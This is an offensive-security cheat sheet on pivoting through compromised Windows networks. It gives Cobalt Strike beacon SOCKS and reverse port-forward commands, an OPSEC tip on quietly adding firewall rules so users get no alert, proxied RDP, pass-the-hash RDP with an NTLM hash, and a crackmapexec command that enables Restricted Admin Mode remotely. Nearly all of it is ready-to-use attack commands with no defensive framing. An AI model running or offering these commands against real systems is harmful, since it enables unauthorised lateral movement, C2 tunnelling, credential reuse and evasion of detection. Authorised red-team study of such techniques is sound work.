# Relaying / Proxying / Tunneling Technics 

## Tunneling


## Socks proxies (CS)
--> Cobalt Strike has both a SOCKS4a and SOCKS5 proxy.  

Socks4
```
beacon> socks 1080
```
Socks5
```
beacon> socks 1080 socks5 disableNoAuth socks_user socks_password enableLogging
```

## Reverse Port Forward (CS)
Reverse Port Forwarding allows a machine to redirect inbound traffic on a specific port to another IP and port.  A useful implementation of this allows machines to bypass firewall and other network segmentation restrictions.  

This will bind port 8080 on Workstation 2.
```
beacon> rportfwd 8080 127.0.0.1 80
beacon> run netstat -anp tcp
TCP    0.0.0.0:8080           0.0.0.0:0              LISTENING
```

Traffic which will hit this port will be tunnelled to CS team server using the C2 channel.  

**OPSEC**: When the Windows firewall is enabled, it will prompt the user with an alert when an application attempts to listen on a port that is not explicitly allowed.  Allowing access requires local admin privileges and clicking cancel will create an explicit block rule.  

You must therefore create an allow rule before running a reverse port forward using either netsh or New-NetFirewallRule, as adding and removing rules does not create a visible alert.  

```
beacon> powershell New-NetFirewallRule -DisplayName "8080-In" -Direction Inbound -Protocol TCP -Action Allow -LocalPort 8080
beacon> powershell Remove-NetFirewallRule -DisplayName "8080-In"
```

## Proxying
#### RDP protocol
Proxy RDP protocol using xfreerdp
```
proxychains xfreerdp /v:192.168.0.10 /u:jdoe /p:Pass123 /d:corp.company.local /dynamic-resolution +clipboard
```

Proxy RDP protocol using [xfreerdp](https://www.kali.org/tools/freerdp2/) and use NTLM hash to authenticate (PTH RDP)
- System need to have *Restricted Admin Mode* enabled.  
- If not enable you will get an error : “*Account Restrictions are preventing this user from signing in.*” 
- Restricted Admin Mode is disabled by default.
```
proxychains xfreerdp /v:192.168.0.10 /u:Administrator /pth:8846F7EAEE8FB117AD06BDD830B7586C
```

Enable *Restricted Admin Mode* (need admin priv)
```
crackmapexec smb 192.168.0.10 -u Administrator -H 8846F7EAEE8FB117AD06BDD830B7586C -x 'reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f'
```

## Resources
- https://offensivedefence.co.uk/posts/ntlm-auth-firefox/